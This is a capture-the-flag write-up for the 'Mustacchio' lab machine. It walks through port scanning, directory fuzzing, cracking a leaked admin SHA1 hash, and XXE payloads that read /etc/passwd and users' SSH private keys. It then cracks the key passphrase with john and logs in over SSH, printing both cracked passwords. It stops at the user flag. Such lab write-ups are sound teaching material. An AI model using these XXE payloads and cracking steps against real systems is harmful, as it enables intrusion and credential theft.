# Mustacchio writeup
## nmap -p- -sV -n 10.10.238.61 -o nmap.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)

step 1. check port 80
step 2. check port 8765
step 3. check port 22

http://10.10.238.61:8765/ - gives login page(admin panel)
## directory enumerate using FFUF on port 80
ffuf -u http://10.10.238.61/FUZZ -w /usr/share/wordlists/dirb/common.txt
found a directroy **/custom**

http://10.10.238.61/custom/js/ -> found this path
there is a users.bak file
download this file using command wget http://10.10.238.61/custom/js/users.bak
file users.bak  -> helps us determine the file type. In this case it is an SQLite 3.x database, last written using SQLite version 3034001

lets try to open the same using sqlite3

$ sqlite3 users.bak                 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables    -> it list the users table
users
sqlite> SELECT * FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

Go to https://crackstation.net/
this is a sha1 hash with value bulldog19

## lets login to admin panel
ffuf -u http://10.10.238.61:8765/FUZZ -w /usr/share/wordlists/dirb/common.txt

Logged in using admin
It asks to add a xml comment
Checked the source code and found //document.cookie = "Example=/auth/dontforget.bak"; 
http://10.10.238.61:8765/auth/dontforget.bak - > downloaded the dontforget.bak file
dontforget.bak: XML 1.0 document
lets add the xml content found in dontforget.bak file to the comment
So the xml content we mention in the comment reflects back.
## lets try for XML injection
XML External Entity injection is working
----------------------------------------------
Refer https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext "hahah"> ]>
<comment>
  <name>&ext;</name>
  <author>Barry Clad</author>
  <com> test1.</com>
</comment>   
-----------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
<comment>
  <name>&ext;</name>
  <author>Barry Clad</author>
  <com> test1.</com>
</comment>   
-----------------------------------------------------
joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash
lets try to access the home directories of joe and barry
<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:////home/joe/.ssh/id_rsa'>]>
here The first two slashes (//) mark the start of the file URI after the file: scheme.
The next two slashes (//) are needed to indicate the absolute path on a local file system. These slashes are necessary when specifying the path on Unix-like systems (e.g., Linux, macOS).
-------------------------------------------------------
joe does not work. So, we try for barry
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///home/joe/.ssh/id_rsa" > ]>
<comment>
  <name>&ext;</name>
  <author>Barry Clad</author>
  <com> test1.</com>
</comment> 
--------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///home/barry/.ssh/id_rsa" > ]>
<comment>
  <name>&ext;</name>
  <author>Barry Clad</author>
  <com> test1.</com>
</comment> 

We get barry's private key
## working with ssh private key
chmod 600 id_rsa
Change this private key to a hash file that john can understand
/usr/share/john/ssh2john.py id_rsa > hash.txt
crack this hash usinh john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
We get the value -> urieljames
lets try to ssh using barry and above password
ssh -i id_rsa barry@10.10.238.61
cat user.txt > userflag





